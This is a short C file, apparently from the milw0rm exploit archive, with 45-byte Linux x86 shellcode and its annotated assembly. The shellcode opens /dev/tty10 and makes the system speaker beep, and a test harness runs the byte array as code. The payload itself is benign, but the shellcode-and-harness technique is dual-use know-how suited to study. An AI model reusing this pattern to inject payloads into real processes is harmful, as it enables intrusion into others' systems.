/*
By Thomas Rinsma <me[at]th0mas.nl> (16 apr. 2008)

Shellcode makes system speaker beep once, 45 bytes:


   ;     int fd = open("/dev/tty10", O_RDONLY);
   push byte 5
   pop eax
   cdq
   push edx
   push 0x30317974
   push 0x742f2f2f
   push 0x7665642f
   mov ebx, esp
   mov ecx, edx
   int 80h

   ;     ioctl(fd, KDMKTONE (19248), 66729180);
   mov ebx, eax
   push byte 54
   pop eax
   mov ecx, 4294948047
   not ecx
   mov edx, 66729180
   int 80h
*/


main()
{
   char shellcode[] =
       "\x6a\x05\x58\x99\x52\x68\x74\x79\x31\x30\x68\x2f\x2f\x2f\x74"
       "\x68\x2f\x64\x65\x76\x89\xe3\x89\xd1\xcd\x80\x89\xc3\x6a\x36"
       "\x58\xb9\xcf\xb4\xff\xff\xf7\xd1\xba\xdc\x34\xfa\x03\xcd\x80";

   (*(void (*)()) shellcode)();
}

// milw0rm.com [2008-09-09]